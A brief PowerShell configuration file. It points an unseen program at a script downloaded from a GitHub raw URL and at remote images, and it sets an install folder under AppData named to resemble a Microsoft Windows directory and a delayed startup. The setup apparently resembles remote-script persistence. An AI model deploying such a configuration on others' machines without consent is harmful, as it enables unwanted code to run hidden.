# config.psd1
@{
    scriptUrl = "https://raw.githubusercontent.com/lunndal/goat/refs/heads/main/Prune-Cache.ps1"
    imagePath = "https://raw.githubusercontent.com/lunndal/goat/main/img/"
    appName = "optCache"
    targetDir =  "$env:APPDATA\Microsoft\Windows\$appName"
    startupDelay = 60
    ximage = "1.jpg"
    image = "emoji-party-transparent.png"
    uninstall = $false
}